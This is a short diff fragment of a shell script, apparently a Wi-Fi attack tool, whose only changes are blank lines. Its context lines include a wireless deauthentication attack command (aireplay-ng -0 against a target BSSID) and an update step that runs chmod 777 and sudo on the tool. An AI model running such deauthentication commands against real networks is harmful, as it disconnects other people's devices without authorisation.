@@ -338,7 +338,6 @@ clear
 echo -e  '\e[1;32m '
 echo attack started ... 
 xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda   
-
 fi
 
 
@@ -411,6 +410,7 @@ chmod 777 *
 sudo ./gs-tool
 echo
 echo [updated programme]
+
 fi
 
 
